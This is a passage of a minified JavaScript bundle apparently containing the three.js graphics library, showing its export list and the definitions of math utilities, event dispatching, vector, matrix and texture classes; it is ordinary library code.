Qa(e)},e.PointLight=Rl,e.PointLightHelper=uu,e.Points=Xa,e.PointsMaterial=Qa,e.PolarGridHelper=mu,e.PolyhedronBufferGeometry=Ao,e.PolyhedronGeometry=os,e.PositionalAudio=kc,e.PropertyBinding=Uc,e.PropertyMixer=Bc,e.QuadraticBezierCurve=Sl,e.QuadraticBezierCurve3=kl,e.Quaternion=pe,e.QuaternionKeyframeTrack=Gs,e.QuaternionLinearInterpolant=Qs,e.REVISION="122",e.RGBADepthPacking=3201,e.RGBAFormat=x,e.RGBAIntegerFormat=1033,e.RGBA_ASTC_10x10_Format=37819,e.RGBA_ASTC_10x5_Format=37816,e.RGBA_ASTC_10x6_Format=37817,e.RGBA_ASTC_10x8_Format=37818,e.RGBA_ASTC_12x10_Format=37820,e.RGBA_ASTC_12x12_Format=37821,e.RGBA_ASTC_4x4_Format=37808,e.RGBA_ASTC_5x4_Format=37809,e.RGBA_ASTC_5x5_Format=37810,e.RGBA_ASTC_6x5_Format=37811,e.RGBA_ASTC_6x6_Format=37812,e.RGBA_ASTC_8x5_Format=37813,e.RGBA_ASTC_8x6_Format=37814,e.RGBA_ASTC_8x8_Format=37815,e.RGBA_BPTC_Format=36492,e.RGBA_ETC2_EAC_Format=N,e.RGBA_PVRTC_2BPPV1_Format=L,e.RGBA_PVRTC_4BPPV1_Format=F,e.RGBA_S3TC_DXT1_Format=B,e.RGBA_S3TC_DXT3_Format=E,e.RGBA_S3TC_DXT5_Format=T,e.RGBDEncoding=H,e.RGBEEncoding=U,e.RGBEFormat=1023,e.RGBFormat=C,e.RGBIntegerFormat=1032,e.RGBM16Encoding=z,e.RGBM7Encoding=$,e.RGB_ETC1_Format=36196,e.RGB_ETC2_Format=O,e.RGB_PVRTC_2BPPV1_Format=I,e.RGB_PVRTC_4BPPV1_Format=P,e.RGB_S3TC_DXT1_Format=M,e.RGFormat=1030,e.RGIntegerFormat=1031,e.RawShaderMaterial=ks,e.Ray=Ue,e.Raycaster=Wc,e.RectAreaLight=Hl,e.RedFormat=1028,e.RedIntegerFormat=1029,e.ReinhardToneMapping=2,e.RepeatWrapping=l,e.ReplaceStencilOp=7681,e.ReverseSubtractEquation=102,e.RingBufferGeometry=ss,e.RingGeometry=ls,e.SRGB8_ALPHA8_ASTC_10x10_Format=37851,e.SRGB8_ALPHA8_ASTC_10x5_Format=37848,e.SRGB8_ALPHA8_ASTC_10x6_Format=37849,e.SRGB8_ALPHA8_ASTC_10x8_Format=37850,e.SRGB8_ALPHA8_ASTC_12x10_Format=37852,e.SRGB8_ALPHA8_ASTC_12x12_Format=37853,e.SRGB8_ALPHA8_ASTC_4x4_Format=37840,e.SRGB8_ALPHA8_ASTC_5x4_Format=37841,e.SRGB8_ALPHA8_ASTC_5x5_Format=37842,e.SRGB8_ALPHA8_ASTC_6x5_Format=37843,e.SRGB8_ALPHA8_ASTC_6x6_Format=37844,e.SRGB8_ALPHA8_ASTC_8x5_Format=37845,e.SRGB8_ALPHA8_ASTC_8x6_Format=37846,e.SRGB8_ALPHA8_ASTC_8x8_Format=37847,e.Scene=Xi,e.SceneUtils={createMultiMaterialObject:function(){},detach:function(){},attach:function(){}},e.ShaderChunk=Qn,e.ShaderLib=Wn,e.ShaderMaterial=In,e.ShadowMaterial=Ss,e.Shape=Pl,e.ShapeBufferGeometry=cs,e.ShapeGeometry=us,e.ShapePath=ic,e.ShapeUtils=Qo,e.ShortType=1011,e.Skeleton=Ma,e.SkeletonHelper=cu,e.SkinnedMesh=xa,e.SmoothShading=2,e.Sphere=Ie,e.SphereBufferGeometry=ds,e.SphereGeometry=ps,e.Spherical=Xc,e.SphericalHarmonics3=Vl,e.Spline=td,e.SplineCurve=Ml,e.SplineCurve3=ed,e.SpotLight=Nl,e.SpotLightHelper=au,e.Sprite=fa,e.SpriteMaterial=ta,e.SrcAlphaFactor=204,e.SrcAlphaSaturateFactor=210,e.SrcColorFactor=202,e.StaticCopyUsage=35046,e.StaticDrawUsage=Q,e.StaticReadUsage=35045,e.StereoCamera=fc,e.StreamCopyUsage=35042,e.StreamDrawUsage=35040,e.StreamReadUsage=35041,e.StringKeyframeTrack=Ws,e.SubtractEquation=101,e.SubtractiveBlending=3,e.TOUCH={ROTATE:0,PAN:1,DOLLY_PAN:2,DOLLY_ROTATE:3},e.TangentSpaceNormalMap=0,e.TetrahedronBufferGeometry=hs,e.TetrahedronGeometry=fs,e.TextBufferGeometry=As,e.TextGeometry=ms,e.Texture=le,e.TextureLoader=ll,e.TorusBufferGeometry=vs,e.TorusGeometry=gs,e.TorusKnotBufferGeometry=ys,e.TorusKnotGeometry=bs,e.Triangle=Mt,e.TriangleFanDrawMode=2,e.TriangleStripDrawMode=1,e.TrianglesDrawMode=0,e.TubeBufferGeometry=_s,e.TubeGeometry=ws,e.UVMapping=300,e.Uint16Attribute=function(e,t){return new Gt(e,t)},e.Uint16BufferAttribute=Gt,e.Uint32Attribute=function(e,t){return new Kt(e,t)},e.Uint32BufferAttribute=Kt,e.Uint8Attribute=function(e,t){return new Ht(e,t)},e.Uint8BufferAttribute=Ht,e.Uint8ClampedAttribute=function(e,t){return new Vt(e,t)},e.Uint8ClampedBufferAttribute=Vt,e.Uniform=Vc,e.UniformsLib=Gn,e.UniformsUtils=Pn,e.UnsignedByteType=v,e.UnsignedInt248Type=w,e.UnsignedIntType=y,e.UnsignedShort4444Type=1017,e.UnsignedShort5551Type=1018,e.UnsignedShort565Type=1019,e.UnsignedShortType=g,e.VSMShadowMap=3,e.Vector2=ie,e.Vector3=he,e.Vector4=ce,e.VectorKeyframeTrack=Ks,e.Vertex=function(e,t,n){return new he(e,t,n)},e.VertexColors=2,e.VideoTexture=Ja,e.WebGL1Renderer=Wi,e.WebGLCubeRenderTarget=Dn,e.WebGLMultisampleRenderTarget=de,e.WebGLRenderTarget=ue,e.WebGLRenderTargetCube=function(e,t,n){return new Dn(e,n)},e.WebGLRenderer=Gi,e.WebGLUtils=Ui,e.WireframeGeometry=Cs,e.WireframeHelper=function(e,t){return new Ha(new Cs(e.geometry),new La({color:void 0!==t?t:16777215}))},e.WrapAroundEnding=2402,e.XHRLoader=function(e){return new nl(e)},e.ZeroCurvatureEnding=2400,e.ZeroFactor=200,e.ZeroSlopeEnding=2401,e.ZeroStencilOp=0,e.sRGBEncoding=R,Object.defineProperty(e,"__esModule",{value:!0})},"object"===_typeof2(n)&&void 0!==t?i(n):"function"==typeof define&&define.amd?define(["exports"],i):i((r="undefined"!=typeof globalThis?globalThis:r||self).THREE={})},{}],271:[function(e,t,n){var r,i;r=this,i=function(e){for(var t,n=100,r=301,i=302,a=303,o=304,s=306,l=307,c=1e3,u=1001,d=1002,p=1003,h=1004,f=1005,A=1006,m=1007,v=1008,g=1009,y=1012,b=1014,_=1015,w=1016,C=1020,x=1022,S=1023,k=1026,M=1027,B=33776,E=33777,T=33778,P=33779,I=35840,F=35841,L=35842,O=35843,N=37492,D=37496,R=3e3,j=3001,U=35044,$=35048,z="300 es",H=function(){function e(){_classCallCheck2(this,e)}return _createClass2(e,[{key:"addEventListener",value:function(e,t){void 0===this._listeners&&(this._listeners={});var n=this._listeners;void 0===n[e]&&(n[e]=[]),-1===n[e].indexOf(t)&&n[e].push(t)}},{key:"hasEventListener",value:function(e,t){if(void 0===this._listeners)return!1;var n=this._listeners;return void 0!==n[e]&&-1!==n[e].indexOf(t)}},{key:"removeEventListener",value:function(e,t){if(void 0!==this._listeners){var n=this._listeners[e];if(void 0!==n){var r=n.indexOf(t);-1!==r&&n.splice(r,1)}}}},{key:"dispatchEvent",value:function(e){if(void 0!==this._listeners){var t=this._listeners[e.type];if(void 0!==t){e.target=this;for(var n=t.slice(0),r=0,i=n.length;r<i;r++)n[r].call(this,e);e.target=null}}}}]),e}(),V=[],Q=0;Q<256;Q++)V[Q]=(Q<16?"0":"")+Q.toString(16);var G=1234567,W=Math.PI/180,K=180/Math.PI;function q(){var e=4294967295*Math.random()|0,t=4294967295*Math.random()|0,n=4294967295*Math.random()|0,r=4294967295*Math.random()|0;return(V[255&e]+V[e>>8&255]+V[e>>16&255]+V[e>>24&255]+"-"+V[255&t]+V[t>>8&255]+"-"+V[t>>16&15|64]+V[t>>24&255]+"-"+V[63&n|128]+V[n>>8&255]+"-"+V[n>>16&255]+V[n>>24&255]+V[255&r]+V[r>>8&255]+V[r>>16&255]+V[r>>24&255]).toUpperCase()}function X(e,t,n){return Math.max(t,Math.min(n,e))}function Y(e,t){return(e%t+t)%t}function J(e,t,n){return(1-n)*e+n*t}function Z(e){return 0==(e&e-1)&&0!==e}function ee(e){return Math.pow(2,Math.ceil(Math.log(e)/Math.LN2))}function te(e){return Math.pow(2,Math.floor(Math.log(e)/Math.LN2))}var ne=Object.freeze({__proto__:null,DEG2RAD:W,RAD2DEG:K,generateUUID:q,clamp:X,euclideanModulo:Y,mapLinear:function(e,t,n,r,i){return r+(e-t)*(i-r)/(n-t)},inverseLerp:function(e,t,n){return e!==t?(n-e)/(t-e):0},lerp:J,damp:function(e,t,n,r){return J(e,t,1-Math.exp(-n*r))},pingpong:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1;return t-Math.abs(Y(e,2*t)-t)},smoothstep:function(e,t,n){return e<=t?0:n<=e?1:(e=(e-t)/(n-t))*e*(3-2*e)},smootherstep:function(e,t,n){return e<=t?0:n<=e?1:(e=(e-t)/(n-t))*e*e*(e*(6*e-15)+10)},randInt:function(e,t){return e+Math.floor(Math.random()*(t-e+1))},randFloat:function(e,t){return e+Math.random()*(t-e)},randFloatSpread:function(e){return e*(.5-Math.random())},seededRandom:function(e){return void 0!==e&&(G=e%2147483647),((G=16807*G%2147483647)-1)/2147483646},degToRad:function(e){return e*W},radToDeg:function(e){return e*K},isPowerOfTwo:Z,ceilPowerOfTwo:ee,floorPowerOfTwo:te,setQuaternionFromProperEuler:function(e,t,n,r,i){var a=Math.cos,o=Math.sin,s=a(n/2),l=o(n/2),c=a((t+r)/2),u=o((t+r)/2),d=a((t-r)/2),p=o((t-r)/2),h=a((r-t)/2),f=o((r-t)/2);switch(i){case"XYX":e.set(s*u,l*d,l*p,s*c);break;case"YZY":e.set(l*p,s*u,l*d,s*c);break;case"ZXZ":e.set(l*d,l*p,s*u,s*c);break;case"XZX":e.set(s*u,l*f,l*h,s*c);break;case"YXY":e.set(l*h,s*u,l*f,s*c);break;case"ZYZ":e.set(l*f,l*h,s*u,s*c)}}}),re=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:0,n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;_classCallCheck2(this,e),this.x=t,this.y=n}return _createClass2(e,[{key:"set",value:function(e,t){return this.x=e,this.y=t,this}},{key:"setScalar",value:function(e){return this.x=e,this.y=e,this}},{key:"setX",value:function(e){return this.x=e,this}},{key:"setY",value:function(e){return this.y=e,this}},{key:"setComponent",value:function(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;default:throw new Error("index is out of range: "+e)}return this}},{key:"getComponent",value:function(e){switch(e){case 0:return this.x;case 1:return this.y;default:throw new Error("index is out of range: "+e)}}},{key:"clone",value:function(){return new this.constructor(this.x,this.y)}},{key:"copy",value:function(e){return this.x=e.x,this.y=e.y,this}},{key:"add",value:function(e,t){return void 0!==t?this.addVectors(e,t):(this.x+=e.x,this.y+=e.y,this)}},{key:"addScalar",value:function(e){return this.x+=e,this.y+=e,this}},{key:"addVectors",value:function(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this}},{key:"addScaledVector",value:function(e,t){return this.x+=e.x*t,this.y+=e.y*t,this}},{key:"sub",value:function(e,t){return void 0!==t?this.subVectors(e,t):(this.x-=e.x,this.y-=e.y,this)}},{key:"subScalar",value:function(e){return this.x-=e,this.y-=e,this}},{key:"subVectors",value:function(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this}},{key:"multiply",value:function(e){return this.x*=e.x,this.y*=e.y,this}},{key:"multiplyScalar",value:function(e){return this.x*=e,this.y*=e,this}},{key:"divide",value:function(e){return this.x/=e.x,this.y/=e.y,this}},{key:"divideScalar",value:function(e){return this.multiplyScalar(1/e)}},{key:"applyMatrix3",value:function(e){var t=this.x,n=this.y,r=e.elements;return this.x=r[0]*t+r[3]*n+r[6],this.y=r[1]*t+r[4]*n+r[7],this}},{key:"min",value:function(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this}},{key:"max",value:function(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this}},{key:"clamp",value:function(e,t){return this.x=Math.max(e.x,Math.min(t.x,this.x)),this.y=Math.max(e.y,Math.min(t.y,this.y)),this}},{key:"clampScalar",value:function(e,t){return this.x=Math.max(e,Math.min(t,this.x)),this.y=Math.max(e,Math.min(t,this.y)),this}},{key:"clampLength",value:function(e,t){var n=this.length();return this.divideScalar(n||1).multiplyScalar(Math.max(e,Math.min(t,n)))}},{key:"floor",value:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this}},{key:"ceil",value:function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this}},{key:"round",value:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this}},{key:"roundToZero",value:function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this}},{key:"negate",value:function(){return this.x=-this.x,this.y=-this.y,this}},{key:"dot",value:function(e){return this.x*e.x+this.y*e.y}},{key:"cross",value:function(e){return this.x*e.y-this.y*e.x}},{key:"lengthSq",value:function(){return this.x*this.x+this.y*this.y}},{key:"length",value:function(){return Math.sqrt(this.x*this.x+this.y*this.y)}},{key:"manhattanLength",value:function(){return Math.abs(this.x)+Math.abs(this.y)}},{key:"normalize",value:function(){return this.divideScalar(this.length()||1)}},{key:"angle",value:function(){return Math.atan2(-this.y,-this.x)+Math.PI}},{key:"distanceTo",value:function(e){return Math.sqrt(this.distanceToSquared(e))}},{key:"distanceToSquared",value:function(e){var t=this.x-e.x,n=this.y-e.y;return t*t+n*n}},{key:"manhattanDistanceTo",value:function(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)}},{key:"setLength",value:function(e){return this.normalize().multiplyScalar(e)}},{key:"lerp",value:function(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this}},{key:"lerpVectors",value:function(e,t,n){return this.x=e.x+(t.x-e.x)*n,this.y=e.y+(t.y-e.y)*n,this}},{key:"equals",value:function(e){return e.x===this.x&&e.y===this.y}},{key:"fromArray",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return this.x=e[t],this.y=e[t+1],this}},{key:"toArray",value:function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[],t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return e[t]=this.x,e[t+1]=this.y,e}},{key:"fromBufferAttribute",value:function(e,t,n){return this.x=e.getX(t),this.y=e.getY(t),this}},{key:"rotateAround",value:function(e,t){var n=Math.cos(t),r=Math.sin(t),i=this.x-e.x,a=this.y-e.y;return this.x=i*n-a*r+e.x,this.y=i*r+a*n+e.y,this}},{key:"random",value:function(){return this.x=Math.random(),this.y=Math.random(),this}},{key:Symbol.iterator,value:regeneratorRuntime.mark((function e(){return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,this.x;case 2:return e.next=4,this.y;case 4:case"end":return e.stop()}}),e,this)}))},{key:"width",get:function(){return this.x},set:function(e){this.x=e}},{key:"height",get:function(){return this.y},set:function(e){this.y=e}}]),e}();re.prototype.isVector2=!0;var ie=function(){function e(){_classCallCheck2(this,e),this.elements=[1,0,0,0,1,0,0,0,1]}return _createClass2(e,[{key:"set",value:function(e,t,n,r,i,a,o,s,l){var c=this.elements;return c[0]=e,c[1]=r,c[2]=o,c[3]=t,c[4]=i,c[5]=s,c[6]=n,c[7]=a,c[8]=l,this}},{key:"identity",value:function(){return this.set(1,0,0,0,1,0,0,0,1),this}},{key:"copy",value:function(e){var t=this.elements,n=e.elements;return t[0]=n[0],t[1]=n[1],t[2]=n[2],t[3]=n[3],t[4]=n[4],t[5]=n[5],t[6]=n[6],t[7]=n[7],t[8]=n[8],this}},{key:"extractBasis",value:function(e,t,n){return e.setFromMatrix3Column(this,0),t.setFromMatrix3Column(this,1),n.setFromMatrix3Column(this,2),this}},{key:"setFromMatrix4",value:function(e){var t=e.elements;return this.set(t[0],t[4],t[8],t[1],t[5],t[9],t[2],t[6],t[10]),this}},{key:"multiply",value:function(e){return this.multiplyMatrices(this,e)}},{key:"premultiply",value:function(e){return this.multiplyMatrices(e,this)}},{key:"multiplyMatrices",value:function(e,t){var n=e.elements,r=t.elements,i=this.elements,a=n[0],o=n[3],s=n[6],l=n[1],c=n[4],u=n[7],d=n[2],p=n[5],h=n[8],f=r[0],A=r[3],m=r[6],v=r[1],g=r[4],y=r[7],b=r[2],_=r[5],w=r[8];return i[0]=a*f+o*v+s*b,i[3]=a*A+o*g+s*_,i[6]=a*m+o*y+s*w,i[1]=l*f+c*v+u*b,i[4]=l*A+c*g+u*_,i[7]=l*m+c*y+u*w,i[2]=d*f+p*v+h*b,i[5]=d*A+p*g+h*_,i[8]=d*m+p*y+h*w,this}},{key:"multiplyScalar",value:function(e){var t=this.elements;return t[0]*=e,t[3]*=e,t[6]*=e,t[1]*=e,t[4]*=e,t[7]*=e,t[2]*=e,t[5]*=e,t[8]*=e,this}},{key:"determinant",value:function(){var e=this.elements,t=e[0],n=e[1],r=e[2],i=e[3],a=e[4],o=e[5],s=e[6],l=e[7],c=e[8];return t*a*c-t*o*l-n*i*c+n*o*s+r*i*l-r*a*s}},{key:"invert",value:function(){var e=this.elements,t=e[0],n=e[1],r=e[2],i=e[3],a=e[4],o=e[5],s=e[6],l=e[7],c=e[8],u=c*a-o*l,d=o*s-c*i,p=l*i-a*s,h=t*u+n*d+r*p;if(0===h)return this.set(0,0,0,0,0,0,0,0,0);var f=1/h;return e[0]=u*f,e[1]=(r*l-c*n)*f,e[2]=(o*n-r*a)*f,e[3]=d*f,e[4]=(c*t-r*s)*f,e[5]=(r*i-o*t)*f,e[6]=p*f,e[7]=(n*s-l*t)*f,e[8]=(a*t-n*i)*f,this}},{key:"transpose",value:function(){var e,t=this.elements;return e=t[1],t[1]=t[3],t[3]=e,e=t[2],t[2]=t[6],t[6]=e,e=t[5],t[5]=t[7],t[7]=e,this}},{key:"getNormalMatrix",value:function(e){return this.setFromMatrix4(e).invert().transpose()}},{key:"transposeIntoArray",value:function(e){var t=this.elements;return e[0]=t[0],e[1]=t[3],e[2]=t[6],e[3]=t[1],e[4]=t[4],e[5]=t[7],e[6]=t[2],e[7]=t[5],e[8]=t[8],this}},{key:"setUvTransform",value:function(e,t,n,r,i,a,o){var s=Math.cos(i),l=Math.sin(i);return this.set(n*s,n*l,-n*(s*a+l*o)+a+e,-r*l,r*s,-r*(-l*a+s*o)+o+t,0,0,1),this}},{key:"scale",value:function(e,t){var n=this.elements;return n[0]*=e,n[3]*=e,n[6]*=e,n[1]*=t,n[4]*=t,n[7]*=t,this}},{key:"rotate",value:function(e){var t=Math.cos(e),n=Math.sin(e),r=this.elements,i=r[0],a=r[3],o=r[6],s=r[1],l=r[4],c=r[7];return r[0]=t*i+n*s,r[3]=t*a+n*l,r[6]=t*o+n*c,r[1]=-n*i+t*s,r[4]=-n*a+t*l,r[7]=-n*o+t*c,this}},{key:"translate",value:function(e,t){var n=this.elements;return n[0]+=e*n[2],n[3]+=e*n[5],n[6]+=e*n[8],n[1]+=t*n[2],n[4]+=t*n[5],n[7]+=t*n[8],this}},{key:"equals",value:function(e){for(var t=this.elements,n=e.elements,r=0;r<9;r++)if(t[r]!==n[r])return!1;return!0}},{key:"fromArray",value:function(e){for(var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,n=0;n<9;n++)this.elements[n]=e[n+t];return this}},{key:"toArray",value:function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[],t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,n=this.elements;return e[t]=n[0],e[t+1]=n[1],e[t+2]=n[2],e[t+3]=n[3],e[t+4]=n[4],e[t+5]=n[5],e[t+6]=n[6],e[t+7]=n[7],e[t+8]=n[8],e}},{key:"clone",value:function(){return(new this.constructor).fromArray(this.elements)}}]),e}();function ae(e){if(0===e.length)return-1/0;for(var t=e[0],n=1,r=e.length;n<r;++n)e[n]>t&&(t=e[n]);return t}ie.prototype.isMatrix3=!0;var oe,se={Int8Array:Int8Array,Uint8Array:Uint8Array,Uint8ClampedArray:Uint8ClampedArray,Int16Array:Int16Array,Uint16Array:Uint16Array,Int32Array:Int32Array,Uint32Array:Uint32Array,Float32Array:Float32Array,Float64Array:Float64Array};function le(e,t){return new se[e](t)}function ce(e){return document.createElementNS("http://www.w3.org/1999/xhtml",e)}var ue=function(){function e(){_classCallCheck2(this,e)}return _createClass2(e,null,[{key:"getDataURL",value:function(e){if(/^data:/i.test(e.src))return e.src;if("undefined"==typeof HTMLCanvasElement)return e.src;var t;if(e instanceof HTMLCanvasElement)t=e;else{void 0===oe&&(oe=ce("canvas")),oe.width=e.width,oe.height=e.height;var n=oe.getContext("2d");e instanceof ImageData?n.putImageData(e,0,0):n.drawImage(e,0,0,e.width,e.height),t=oe}return 2048<t.width||2048<t.height?t.toDataURL("image/jpeg",.6):t.toDataURL("image/png")}}]),e}(),de=0,pe=function(e){_inherits2(n,H);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:n.DEFAULT_IMAGE,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:n.DEFAULT_MAPPING,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:u,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:u,s=4<arguments.length&&void 0!==arguments[4]?arguments[4]:A,l=5<arguments.length&&void 0!==arguments[5]?arguments[5]:v,c=6<arguments.length&&void 0!==arguments[6]?arguments[6]:S,d=7<arguments.length&&void 0!==arguments[7]?arguments[7]:g,p=8<arguments.length&&void 0!==arguments[8]?arguments[8]:1,h=9<arguments.length&&void 0!==arguments[9]?arguments[9]:R;return _classCallCheck2(this,n),e=t.call(this),Object.defineProperty(_assertThisInitialized2(e),"id",{value:de++}),e.uuid=q(),e.name="",e.image=r,e.mipmaps=[],e.mapping=i,e.wrapS=a,e.wrapT=o,e.magFilter=s,e.minFilter=l,e.anisotropy=p,e.format=c,e.internalFormat=null,e.type=d,e.offset=new re(0,0),e.repeat=new re(1,1),e.center=new re(0,0),e.rotation=0,e.matrixAutoUpdate=!0,e.matrix=new ie,e.generateMipmaps=!0,e.premultiplyAlpha=!1,e.flipY=!0,e.unpackAlignment=4,e.encoding=h,e.userData={},e.version=0,e.onUpdate=null,e.isRenderTargetTexture=!1,e}return _createClass2(n,[{key:"updateMatrix",value:function(){this.matrix.setUvTransform(this.offset.x,this.offset.y,this.repeat.x,this.repeat.y,this.rotation,this.center.x,this.center.y)}},{key:"clone",value:function(){return(new this.constructor).copy(this)}},{key:"copy",value:function(e){return this.name=e.name,this.image=e.image,this.mipmaps=e.mipmaps.slice(0),this.mapping=e.mapping,this.wrapS=e.wrapS,this.wrapT=e.wrapT,this.magFilter=e.magFilter,this.minFilter=e.minFilter,this.anisotropy=e.anisotropy,this.format=e.format,this.internalFormat=e.internalFormat,this.type=e.type,this.offset.copy(e.offset),this.repeat.copy(e.repeat),this.center.copy(e.center),this.rotation=e.rotation,this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrix.copy(e.matrix),this.generateMipmaps=e.generateMipmaps,this.premultiplyAlpha=e.premultiplyAlpha,this.flipY=e.flipY,this.unpackAlignment=e.unpackAlignment,this.encoding=e.encoding,this.userData=JSON.parse(JSON.stringify(e.userData)),this}},{key:"toJSON",value:function(e){var t=void 0===e||"string"==typeof e;if(!t&&void 0!==e.textures[this.uuid])return e.textures[this.uuid];var n={metadata:{version:4.5,type:"Texture",generator:"Texture.toJSON"},uuid:this.uuid,name:this.name,mapping:this.mapping,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,this.offset.y],center:[this.center.x,this.center.y],rotation:this.rotation,wrap:[this.wrapS,this.wrapT],format:this.format,type:this.type,encoding:this.encoding,minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy,flipY:this.flipY,premultiplyAlpha:this.premultiplyAlpha,unpackAlignment:this.unpackAlignment};if(void 0!==this.image){var r=this.image;if(void 0===r.uuid&&(r.uuid=q()),!t&&void 0===e.images[r.uuid]){var i;if(Array.isArray(r)){i=[];for(var a=0,o=r.length;a<o;a++)r[a].isDataTexture?i.push(he(r[a].image)):i.push(he(r[a]))}else i=he(r);e.images[r.uuid]={uuid:r.uuid,url:i}}n.image=r.uuid}return"{}"!==JSON.stringify(this.userData)&&(n.userData=this.userData),t||(e.textures[this.uuid]=n),n}},{key:"dispose",value:function(){this.dispatchEvent({type:"dispose"})}},{key:"transformUv",value:function(e){if(300!==this.mapping)return e;if(e.applyMatrix3(this.matrix),e.x<0||1<e.x)switch(this.wrapS){case c:e.x=e.x-Math.floor(e.x);break;case u:e.x=e.x<0?0:1;break;case d:1===Math.abs(Math.floor(e.x)%2)?e.x=Math.ceil(e.x)-e.x:e.x=e.x-Math.floor(e.x)}if(e.y<0||1<e.y)switch(this.wrapT){case c:e.y=e.y-Math.floor(e.y);break;case u:e.y=e.y<0?0:1;break;case d:1===Math.abs(Math.floor(e.y)%2)?e.y=Math.ceil(e.y)-e.y:e.y=e.y-Math.floor(e.y)}return this.flipY&&(e.y=1-e.y),e}},{key:"needsUpdate",set:function(e){!0===e&&this.version++}}]),n}();function he(e){return"undefined"!=typeof HTMLImageElement&&e instanceof HTMLImageElement||"undefined"!=typeof HTMLCanvasElement&&e instanceof HTMLCanvasElement||"undefined"!=typeof ImageBitmap&&e instanceof ImageBitmap?ue.getDataURL(e):e.data?{data:Array.prototype.slice.call(e.data),width:e.width,height:e.height,type:e.data.constructor.name}:{}}pe.DEFAULT_IMAGE=void 0,pe.DEFAULT_MAPPING=300,pe.prototype.isTexture=!0;var fe=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:0,n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,r=2<arguments.length&&void 0!==arguments[2]?arguments[2]:0,i=3<arguments.length&&void 0!==arguments[3]?arguments[3]:1;_classCallCheck2(this,e),this.x=t,this.y=n,this.z=r,this.w=i}return _createClass2(e,[{key:"set",value:function(e,t,n,r){return this.x=e,this.y=t,this.z=n,this.w=r,this}},{key:"setScalar",value:function(e){return this.x=e,this.y=e,this.z=e,this.w=e,this}},{key:"setX",value:function(e){return this.x=e,this}},{key:"setY",value:function(e){return this.y=e,this}},{key:"setZ",value:function(e){return this.z=e,this}},{key:"setW",value:function(e){return this.w=e,this}},{key:"setComponent",value:function(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;case 2:this.z=t;break;case 3:this.w=t;break;default:throw new Error("index is out of range: "+e)}return this}},{key:"getComponent",value:function(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw new Error("index is out of range: "+e)}}},{key:"clone",value:function(){return new this.constructor(this.x,this.y,this.z,this.w)}},{key:"copy",value:function(e){return this.x=e.x,this.y=e.y,this.z=e.z,this.w=void 0!==e.w?e.w:1,this}},{key:"add",value:function(e,t){return void 0!==t?this.addVectors(e,t):(this.x+=e.x,this.y+=e.y,this.z+=e.z,this.w+=e.w,this)}},{key:"addScalar",value:function(e){return this.x+=e,this.y+=e,this.z+=e,this.w+=e,this}},{key:"addVectors",value:function(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this.z=e.z+t.z,this.w=e.w+t.w,this}},{key:"addScaledVector",value:function(e,t){return this.x+=e.x*t,this.y+=e.y*t,this.z+=e.z*t,this.w+=e.w*t,this}},{key:"sub",value:function(e,t){return void 0!==t?this.subVectors(e,t):(this.x-=e.x,this.y-=e.y,this.z-=e.z,this.w-=e.w,this)}},{key:"subScalar",value:function(e){return this.x-=e,this.y-=e,this.z-=e,this.w-=e,this}},{key:"subVectors",value:function(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this.z=e.z-t.z,this.w=e.w-t.w,this}},{key:"multiply",value:function(e){return this.x*=e.x,this.y*=e.y,this.z*=e.z,this.w*=e.w,this}},{key:"multiplyScalar",value:function(e){return this.x*=e,this.y*=e,this.z*=e,this.w*=e,this}},{key:"applyMatrix4",value:function(e){var t=this.x,n=this.y,r=this.z,i=this.w,a=e.elements;return this.x=a[0]*t+a[4]*n+a[8]*r+a[12]*i,this.y=a[1]*t+a[5]*n+a[9]*r+a[13]*i,this.z=a[2]*t+a[6]*n+a[10]*r+a[14]*i,this.w=a[3]*t+a[7]*n+a[11]*r+a[15]*i,this}},{key:"divideScalar",value:function(e){return this.multiplyScalar(1/e)}},{key:"setAxisAngleFromQuaternion",value:function(e){this.w=2*Math.acos(e.w);var t=Math.sqrt(1-e.w*e.w);return this.z=t<1e-4?(this.x=1,this.y=0):(this.x=e.x/t,this.y=e.y/t,e.z/t),this}},{key:"setAxisAngleFromRotationMatrix",value:function(e){var t,n,r,i,a=e.elements,o=a[0],s=a[4],l=a[8],c=a[1],u=a[5],d=a[9],p=a[2],h=a[6],f=a[10];if(Math.abs(s-c)<.01&&Math.abs(l-p)<.01&&Math.abs(d-h)<.01){if(Math.abs(s+c)<.1&&Math.abs(l+p)<.1&&Math.abs(d+h)<.1&&Math.abs(o+u+f-3)<.1)return this.set(1,0,0,0),this;t=Math.PI;var 